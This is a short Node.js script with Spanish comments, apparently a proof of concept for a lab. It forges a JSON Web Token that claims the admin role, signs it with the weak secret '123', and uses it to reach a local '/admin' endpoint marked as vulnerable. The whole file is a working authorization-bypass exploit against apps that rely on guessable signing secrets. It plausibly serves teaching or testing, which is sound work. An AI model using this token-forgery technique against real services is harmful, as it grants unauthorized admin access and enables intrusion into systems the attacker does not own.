const axios = require('axios');
const jwt = require('jsonwebtoken');

async function main() {
  // 1) Construir un token válido con rol admin firmado con secret débil "123"
  const weakSecret = '123';
  const payload = { user: 'juan', role: 'admin', resigned: true };
  const token = jwt.sign(payload, weakSecret, { algorithm: 'HS256' });
  console.log('[resign] Token con secret débil 123:', token);

  // 2) Acceder a /admin vulnerable
  const res = await axios.get('http://localhost:3000/admin', {
    headers: { Authorization: `Bearer ${token}` }
  });
  console.log('[resign] Respuesta /admin:', res.data);
}

main().catch(err => {
  if (err.response) console.error('HTTP', err.response.status, err.response.data);
  else console.error(err.message);
  process.exit(1);
});
